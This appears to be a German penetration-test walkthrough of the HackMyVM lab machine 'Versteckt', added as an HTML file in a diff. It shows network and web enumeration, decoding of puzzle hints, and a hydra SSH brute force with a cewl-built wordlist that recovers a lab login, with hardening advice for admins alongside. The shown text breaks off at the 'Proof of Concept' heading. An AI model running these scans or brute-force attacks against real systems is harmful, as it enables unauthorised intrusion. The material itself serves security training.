@@ -1,0 +1,821 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Versteckt - HackMyVM - Medium - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Hintergrundfarbe wird durch CSS gesteuert -->
+    <div class="header-bg">
+        <h1>Versteckt - HackMyVM - Medium - Bericht</h1> <!-- Titel angepasst -->
+        <!-- Schwierigkeitsgrad-Container mit Klasse für CSS-Styling -->
+        <div class="level-container level-medium"> <!-- Klasse medium für korrekte Farbe via CSS -->
+            <!-- Kein Inline-Style mehr -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Kein Inline-Style mehr -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools werden hier eingefügt -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">Online Morse Decoder</div>
+                <div class="tool-item">cewl</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">mysql (client)</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">passwd</div>
+                <div class="tool-item">chsn (custom binary)</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">tail</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis wird hier eingefügt -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Reconnaissance Inhalt beginnt hier -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 08:00:27:09:b6:08, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+<span class="command">192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD</span>
+<span class="command">192.168.2.102	ac:6f:bb:62:87:79	TATUNG Technology Inc.</span>
+<span class="command">192.168.2.104	84:25:19:2f:66:32	Samsung Electronics</span>
+<span class="command">192.168.2.139	08:00:27:21:22:70	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerksegment zu entdecken. Er sendet ARP-Anfragen und listet die antwortenden Geräte mit IP-Adresse, MAC-Adresse und dem Hersteller (basierend auf der MAC-Adresse) auf. Die IP `192.168.2.139` wird als potenzielles Ziel identifiziert, die MAC-Adresse (`08:00:27:...`) deutet auf eine VirtualBox-VM hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein effektiver erster Schritt zur Host-Entdeckung im lokalen Netzwerk. Wir haben die IP-Adresse unseres Ziels (`192.168.2.139`) erfolgreich identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP `192.168.2.139` für weitere Scans (Nmap).
+<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung können helfen, unautorisierte Scans zu erkennen. Stellen Sie sicher, dass nur autorisierte Geräte im Netzwerk sind.</p>
+
+            <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.139 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 16:08 CEST
+Nmap scan report for versteckt (192.168.2.139)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+<span class="command">80/tcp    open  http    Apache httpd 2.4.51 ((Debian))</span>
+|_http-title: Index of /
+|_http-server-header: Apache/2.4.51 (Debian)
+<span class="command">22334/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="password">3072 7b:c0:c0:c9:62:10:2f:67:ac:8d:d9:e5:88:26:15:93 (RSA)</span>
+|   <span class="password">256 59:73:c6:ce:52:8e:11:47:ba:9b:b1:51:41:3c:fa:18 (ECDSA)</span>
+|_  <span class="password">256 b4:e1:e1:f1:95:bb:b5:23:7e:2e:80:27:4a:a1:c7:ee (ED25519)</span>
+MAC Address: 08:00:27:21:22:70 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6, Linux 5.0 - 5.3, AXIS 210A or 211 Network Camera (Linux 2.6.17), Linux 5.4, Linux 2.6.32, Linux 3.2 - 4.9, Linux 2.6.32 - 3.10, Linux 5.3 - 5.4, Linux 5.0 - 5.4, Linux 3.4 - 3.10
+Aggressive OS guesses: Linux 4.15 - 5.6 (97%), Linux 5.0 - 5.3 (96%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 5.4 (94%), Linux 2.6.32 (94%), Linux 3.2 - 4.9 (94%), Linux 2.6.32 - 3.10 (94%), Linux 5.3 - 5.4 (94%), Linux 5.0 - 5.4 (93%), Linux 3.4 - 3.10 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms versteckt (192.168.2.139)
+
+Nmap done: 1 IP address (1 host up) scanned in 33.11 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe einen umfassenden Nmap-Scan gegen das Ziel `192.168.2.139` durch.
+*   `-sS`: SYN-Scan (Stealth-Scan).
+*   `-sC`: Führt Standard-Nmap-Skripte aus.
+*   `-T5`: Sehr aggressives Timing für hohe Geschwindigkeit.
+*   `-sV`: Ermittelt Dienstversionen.
+*   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+*   `-p-`: Scannt alle 65535 TCP-Ports.
+Die Ergebnisse zeigen zwei offene Ports:
+*   **Port 80 (HTTP):** Apache httpd 2.4.51 (Debian). Der Titel der Seite ist "Index of /", was auf aktiviertes Directory Listing hindeutet.
+*   **Port 22334 (SSH):** OpenSSH 8.4p1 (Debian). SSH läuft auf einem nicht-standardmäßigen Port.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Ergebnis grenzt die Angriffsfläche deutlich ein. Der Webserver auf Port 80 mit aktiviertem Directory Listing ist ein primäres Ziel für weitere Enumeration. Der SSH-Dienst auf dem ungewöhnlichen Port 22334 ist ebenfalls ein wichtiger Vektor, falls Zugangsdaten gefunden werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver auf Port 80 genauer (Directory Listing durchsuchen, Gobuster, Nikto). Versuche, gültige SSH-Zugangsdaten für Port 22334 zu finden (z.B. durch Web-Exploitation, Brute-Force, falls Benutzer bekannt sind).
+<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Listing auf dem Webserver (`Options -Indexes` in der Apache-Konfiguration). Verwenden Sie Standardports nur, wenn unbedingt nötig, oder dokumentieren Sie nicht-standardmäßige Ports gut. Stellen Sie sicher, dass SSH sicher konfiguriert ist (starke Passwörter, Key-basierte Authentifizierung bevorzugen, evtl. Fail2Ban).</p>
+            <!-- Reconnaissance Inhalt endet hier -->
+        </section>
+
+        <hr style="border-top: 3px solid #bbb; margin: 30px 0;">
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Web Enumeration Inhalt beginnt hier -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.139 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg,html -e --wildcard</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.139
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,bak,7z,zip,py,sql,txt,xml,jpg,html
+[+] Expanded:                true
+[+] Wildcard detected:       true
+[+] Timeout:                 10s
+===============================================================
+2022/10/11 16:11:11 Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.139/index.html</span>           (Status: 200) [Size: 559]
+<span class="command">http://192.168.2.139/icons</span>                (Status: 301) [Size: 314] [--> http://192.168.2.139/icons/]
+<span class="command">http://192.168.2.139/robots.txt</span>           (Status: 200) [Size: 64]
+===============================================================
+2022/10/11 16:11:58 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze `gobuster` im `dir`-Modus, um nach Verzeichnissen und Dateien auf dem Webserver zu suchen.
+*   `-u http://192.168.2.139`: Ziel-URL.
+*   `-w ...medium.txt`: Standard-Wortliste.
+*   `-x ...`: Liste von Dateierweiterungen.
+*   `-e`: Zeigt volle URLs an.
+*   `--wildcard`: Erkennt und versucht, Wildcard-Antworten (bei denen der Server für nicht existierende Seiten immer denselben Inhalt liefert) zu behandeln.
+Gobuster findet `index.html` (die Standardseite), das Verzeichnis `/icons` (oft von Apache für Directory Listings verwendet) und die wichtige Datei `robots.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ergebnisse sind zunächst begrenzt, aber `/robots.txt` ist immer ein vielversprechender Fund, da sie oft Hinweise auf versteckte oder sensible Bereiche enthält, die von Suchmaschinen ignoriert werden sollen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `/robots.txt` sorgfältig. Überprüfe auch das `/icons`-Verzeichnis, obwohl es selten direkt ausnutzbar ist.
+<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `/robots.txt` keine Pfade zu sensiblen oder administrativen Bereichen preisgibt.</p>
+
+            <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.139</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.139
++ Target Hostname:    192.168.2.139
++ Target Port:        80
++ Start Time:         2022-10-11 16:13:56 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.51 (Debian)
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> This header can hint to the user agent to protect against some forms of XSS
++ <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ <span class="command">OSVDB-3268: /: Directory indexing found.</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /, inode: 22f, size: 5d1c2696a7b80, mtime: gzip
++ OSVDB-3268: /index.html: Directory indexing found.
++ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST
++ OSVDB-3268: /./: Directory indexing found.
++ /./: Appending '/./' to a directory allows indexing
++ OSVDB-3268: //: Directory indexing found.
++ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
++ OSVDB-3268: /%2e/: Directory indexing found.
++ OSVDB-576: /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
++ OSVDB-3268: ///: Directory indexing found.
++ OSVDB-119: /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
++ OSVDB-119: /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
++ OSVDB-3268: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
++ OSVDB-3288: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /'s are requested.
++ 7915 requests: 0 error(s) and 18 item(s) reported on remote host
++ End Time:           2022-10-11 16:14:41 (GMT2) (45 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+      *********************************************************************
+      Portions of the server's headers (Apache/2.4.51) are not in
+      the Nikto 2.1.6 database or are newer than the known string. Would you like
+      to submit this information (*no server specific data*) to CIRT.net
+      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y
+
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined.</span> This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The site uses SSL and Expect-CT header is not present.
+- Sent updated info to cirt.net -- Thank you!
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `nikto`, einen Webserver-Scanner, um nach bekannten Schwachstellen und Konfigurationsfehlern zu suchen. Nikto identifiziert mehrere Probleme:
+*   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`).
+*   Aktives Directory Listing im Root-Verzeichnis (`/`) und bestätigt dies für verschiedene Pfad-Variationen (`/./`, `//`, `/%2e/`, etc.).
+*   Mögliches Informationsleck durch ETags (Inodes).
+*   Listet erlaubte HTTP-Methoden auf.
+*   Meldet veraltete OSVDB-Einträge, die auf mögliche Directory-Listing-Probleme in älteren oder spezifischen Serverkonfigurationen hinweisen (hier wahrscheinlich False Positives aufgrund des allgemeinen Directory Listings).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Bestätigung des Directory Listings ist der wichtigste Fund hier. Fehlende Sicherheitsheader sind häufig, aber weniger kritisch. Die ETag-Informationen sind selten direkt ausnutzbar. Die vielen Treffer für Directory Listing unterstreichen diese Fehlkonfiguration.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Navigiere manuell durch das Directory Listing im Browser oder mit `curl`, um interessante Dateien oder Verzeichnisse zu finden, die `gobuster` möglicherweise übersehen hat.
+<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Listing (`Options -Indexes` in Apache). Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`, `X-XSS-Protection`). Konfigurieren Sie ETags so, dass keine Inodes preisgegeben werden (`FileETag MTime Size` statt `INode MTime Size`).</p>
+
+            <hr style="border-top: 3px solid #bbb; margin: 30px 0;">
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc 192.168.2.139 22334</span></div>
+                    <pre>
+<span class="password">SSH-2.0-OpenSSH_8.4p1 Debian-5</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich benutze `nc` (Netcat), um eine einfache Verbindung zum SSH-Port (22334) herzustellen. Der Server antwortet mit seinem SSH-Banner, der die Version `OpenSSH 8.4p1 Debian-5` bestätigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die von Nmap gefundene SSH-Version. Nützlich für die Suche nach spezifischen Schwachstellen für diese Version (obwohl für OpenSSH seltener als für Webanwendungen).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nach bekannten Schwachstellen für OpenSSH 8.4p1 (z.B. Benutzer-Enumeration über Timing-Angriffe, aber unwahrscheinlich). Konzentriere dich auf das Erlangen gültiger Zugangsdaten.
+<br><strong>Empfehlung (Admin):</strong> Halten Sie OpenSSH auf dem neuesten Stand. Konfigurieren Sie es sicher (siehe vorherige Empfehlung).</p>
+
+            <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+            <p class="analysis"><strong>Analyse des robots.txt Inhalts:</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.139/robots.txt</span></div>
+                    <pre>
+<span class="password">Sierra Three Charlie Romeo Three Tango Zulu Zero November Three</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich rufe den Inhalt der `robots.txt` mit `curl` ab. Statt der üblichen `User-agent:` und `Disallow:` Direktiven enthält die Datei eine Reihe von Wörtern aus dem NATO-Alphabet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer Hinweis auf ein Rätsel oder eine versteckte Nachricht. Die Wörter `Sierra`, `Three`, `Charlie`, `Romeo`, `Three`, `Tango`, `Zulu`, `Zero`, `November`, `Three` entsprechen den Anfangsbuchstaben bzw. Ziffern `S`, `3`, `C`, `R`, `3`, `T`, `Z`, `0`, `N`, `3`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Setze die Buchstaben und Ziffern zusammen: `S3CR3TZ0N3`. Dies ist höchstwahrscheinlich der Name eines versteckten Verzeichnisses. Versuche, auf `http://192.168.2.139/S3CR3TZ0N3/` (oder `s3cr3tz0n3/`) zuzugreifen.</p>
+
+            <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.139/s3cr3tz0n3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,xml,wav -e</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.139/s3cr3tz0n3
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,txt,xml,wav
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/11 16:19:56 Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.139/s3cr3tz0n3/index.html</span>           (Status: 200) [Size: 1128]
+<span class="command">http://192.168.2.139/s3cr3tz0n3/audio.wav</span>            (Status: 200) [Size: 179972]
+===============================================================
+2022/10/11 16:20:41 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf dem Fund aus `robots.txt` starte ich einen `gobuster`-Scan auf das Verzeichnis `/s3cr3tz0n3/`. Ich suche nach Dateien mit den Erweiterungen `php`, `html`, `txt`, `xml`, `wav`. Der Scan findet eine `index.html` und eine `audio.wav`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis existiert und enthält eine Webseite (`index.html`) und eine Audiodatei (`audio.wav`). Die Audiodatei ist besonders interessant im Kontext von Rätseln und versteckten Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche `index.html` und lade `audio.wav` herunter, um sie zu analysieren (z.B. auf Morsecode, Steganographie, Audiospektrogramm).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.139/s3cr3tz0n3/audio.wav</span></div>
+                    <pre>
+--2022-10-11 16:21:40--  http://192.168.2.139/s3cr3tz0n3/audio.wav
+Verbindungsaufbau zu 192.168.2.139:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 179972 (176K) [audio/x-wav]
+Wird in »audio.wav« gespeichert.
+
+audio.wav                     100%[===============================================>] 175,75K  --.-KB/s    in 0,002s
+
+<span class="password">2022-10-11 16:21:40 (113 MB/s) - »audio.wav« gespeichert [179972/179972]</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich lade die gefundene `audio.wav`-Datei mit `wget` herunter.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt zur weiteren Analyse der Audiodatei.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere die `audio.wav`-Datei.</p>
+
+            <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+            <p class="analysis"><strong>Analyse der audio.wav:</strong></p>
+            <pre>
+https://morsecode.world/international/decoder/audio-decoder-adaptive.html: audio.wav
+gefunden: <span class="password">/m0r3inf0</span>
+            </pre>
+            <p class="analysis"><strong>Analyse:</strong> Die heruntergeladene `audio.wav`-Datei wurde mit einem Online-Morsecode-Decoder analysiert. Das Ergebnis der Dekodierung ist der Text `/m0r3inf0`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wieder ein Hinweis auf ein weiteres verstecktes Verzeichnis, diesmal kodiert als Morsecode in einer Audiodatei. Das Verzeichnis lautet `/m0r3inf0` und befindet sich wahrscheinlich innerhalb von `/s3cr3tz0n3/`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greife auf das Verzeichnis `http://192.168.2.139/s3cr3tz0n3/m0r3inf0/` zu und untersuche dessen Inhalt.</p>
+
+            <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt hier, nur die URL und Status/Größe -->
+                     <pre><span class="command">http://192.168.2.139/s3cr3tz0n3/m0r3inf0/index.html</span>           (Status: 200) [Size: 2884]</pre>
+                     </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ich greife auf die `index.html` im neu entdeckten Verzeichnis `/s3cr3tz0n3/m0r3inf0/` zu (wahrscheinlich im Browser oder mit einem Tool). Die Seite existiert (Status 200) und hat eine Größe von 2884 Bytes.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis und die darin enthaltene Webseite sind bestätigt. Der Inhalt dieser Seite ist der nächste Anhaltspunkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere den Inhalt und den Quellcode von `index.html` in diesem Verzeichnis.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.139/s3cr3tz0n3/m0r3inf0/index.html --output text.txt</span></div>
+                    <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2884  100  2884    0     0   588k      0 --:--:-- --:--:-- --:--:--  588k
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich lade den Inhalt der Webseite `http://192.168.2.139/s3cr3tz0n3/m0r3inf0/index.html` mit `curl` herunter und speichere ihn in der Datei `text.txt`. Die Ausführung ist erfolgreich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies speichert den HTML-Inhalt lokal, um ihn weiter zu analysieren oder Tools darauf anzuwenden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende Tools wie `cewl` (siehe nächster Schritt) oder analysiere `text.txt` manuell auf interessante Wörter oder Hinweise.</p>
+
+            <!-- Web Enumeration Inhalt endet hier -->
+        </section>
+
+        <hr style="border-top: 3px solid #bbb; margin: 30px 0;">
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Initial Access Inhalt beginnt hier -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cewl -d 3 -m 5 http://192.168.2.139/s3cr3tz0n3/m0r3inf0/ > text.txt</span></div>
+                    <pre>
+<span class="password">(cewl startet und durchsucht die Seite - keine direkte Ausgabe hier, Ergebnis in text.txt)</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `cewl` (Custom Word List generator), um eine Wortliste basierend auf dem Inhalt der Webseite `http://192.168.2.139/s3cr3tz0n3/m0r3inf0/` zu erstellen.
+*   `-d 3`: Durchsucht die Seite bis zu einer Tiefe von 3 Links.
+*   `-m 5`: Berücksichtigt nur Wörter mit einer Mindestlänge von 5 Zeichen.
+*   `>`: Leitet die Ausgabe (die generierte Wortliste) in die Datei `text.txt` um (überschreibt die vorherige `text.txt`, die den HTML-Code enthielt).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein intelligenter Ansatz, um potenzielle Passwörter zu finden, die im Kontext der Webseite relevant sein könnten. Die Hoffnung ist, dass Benutzernamen (wie `marcus`, der im nächsten Schritt verwendet wird) oder Passwörter im Text der Seite vorkommen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende die generierte Wortliste `text.txt` für Brute-Force-Angriffe gegen gefundene Dienste (insbesondere SSH auf Port 22334). Überprüfe die Wortliste auch manuell auf offensichtliche Kandidaten.
+<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie es, sensible Informationen oder leicht zu erratende Passwörter direkt im Text von Webseiten zu verwenden.</p>
+
+            <hr style="border-top: 1px dashed #ccc; margin: 20px 0;">
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l marcus -P text.txt -f 192.168.2.139 -s 22334 -t 64 ssh</span></div>
+                    <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-11 16:36:07
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended
+
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 145 login tries (l:1/p:145)
+[DATA] attacking ssh://192.168.2.139:22334/
+[22334][ssh] host: 192.168.2.139   login: marcus   <span class="password">password: Falcon</span>
+[STATUS] 1.00 tries/min, 1 tries in 00:01h, 144 to do in 02:24h, 1 active tasks
+[STATUS] 1.00 tries/min, 1 tries in 00:01h, 144 to do in 02:24h, 1 active tasks
+[STATUS] 1.00 tries/min, 1 tries in 00:01h, 144 to do in 02:24h, 1 active tasks
+<span class="password">1 of 1 target successfully completed, 1 valid password found</span>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-11 16:36:18
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich starte einen SSH-Brute-Force-Angriff mit `hydra`.
+*   `-l marcus`: Der Benutzername, der getestet wird (woher dieser Name stammt, ist im Text nicht explizit erwähnt, möglicherweise aus der Analyse der `index.html` oder eine Vermutung).
+*   `-P text.txt`: Verwendet die zuvor mit `cewl` erstellte Wortliste.
+*   `-f`: Stoppt, sobald ein gültiges Passwort gefunden wurde.
+*   `192.168.2.139`: Die Ziel-IP.
+*   `-s 22334`: Der SSH-Port.
+*   `-t 64`: Verwendet 64 parallele Tasks (Threads).
+*   `ssh`: Das zu verwendende Hydra-Modul.
+Hydra findet erfolgreich das Passwort `<span class="password">Falcon</span>` für den Benutzer `marcus`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Der Initial Access ist gelungen. Wir haben gültige SSH-Zugangsdaten (`marcus:Falcon`) für das Zielsystem gefunden, indem wir eine kontextbasierte Wortliste aus der Webseite generiert und für einen Brute-Force-Angriff verwendet haben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Logge dich mit den gefundenen Zugangsdaten per SSH auf dem Zielsystem ein.
+<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter, die nicht leicht aus Webseiteninhalten oder anderen öffentlichen Quellen erraten werden können. Implementieren Sie Intrusion-Detection/Prevention-Systeme wie Fail2Ban, um Brute-Force-Angriffe auf SSH zu blockieren.</p>
+            <!-- Initial Access Inhalt endet hier -->
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept: SSH-Zugriff mit kompromittierten Zugangsdaten</h2>
